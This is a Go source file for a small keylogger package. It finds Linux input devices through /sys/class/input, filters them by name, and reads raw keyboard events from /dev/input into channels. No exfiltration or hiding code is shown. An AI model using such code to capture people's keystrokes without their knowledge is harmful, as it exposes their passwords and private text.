// Package keylogger is a simple 0 dependency keylogger package
package keylogger

import (
	"context"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"strings"
	"sync"
)

const (
	inputPath  = "/sys/class/input/event%d/device/name"
	deviceFile = "/dev/input/event%d"
)

// KeyLogger keeps a reference to the InputDevices that it's listening to.
type KeyLogger struct {
	inputDevices []*InputDevice
}

// NewKeyLogger creates a new keylogger for a set of devices, based on their name.
func NewKeyLogger(deviceNames []string) *KeyLogger {
	devs := scanDevices(deviceNames)
	return &KeyLogger{
		inputDevices: devs,
	}
}

// GetDevices returns the devices that have been found
func (kl *KeyLogger) GetDevices() []*InputDevice {
	return kl.inputDevices
}

// scanDevices gets the desired input device, or returns all of them if no device name is sent.
func scanDevices(deviceNames []string) []*InputDevice {
	var devs []*InputDevice
	retrycount := 0

	for i := 0; i < 255; i++ {
		buff, err := os.ReadFile(fmt.Sprintf(inputPath, i))
		if errors.Is(err, fs.ErrNotExist) {
			// File doesn't exist, there could be other files/devices further up, increase the retry count.
			retrycount++
			if retrycount > 15 {
				// We've retried 15 times, there probably aren't any other devices connected.
				break
			}
			continue
		}
		if err != nil {
			fmt.Printf("can't read input device file: %v\n", err)
			break
		}
		dev := newInputDevice(buff, i)

		if len(deviceNames) == 0 {
			devs = append(devs, dev)
			continue
		}

		for _, deviceName := range deviceNames {
			deviceName = strings.ToLower(deviceName)
			contains := strings.Contains(strings.ToLower(dev.Name), deviceName)
			if deviceName == dev.Name || contains {
				devs = append(devs, dev)
			}
		}

	}

	return devs
}

// Read the devices' input events and send them on their respective channels.
func (kl *KeyLogger) Read(ctx context.Context, cwait chan struct{}, cie chan InputEvent, cer chan error) {
	wg := new(sync.WaitGroup)

	for _, d := range kl.GetDevices() {
		wg.Add(1)
		go d.Read(ctx, wg, cie, cer)
	}

	wg.Wait()
	cwait <- struct{}{}
}
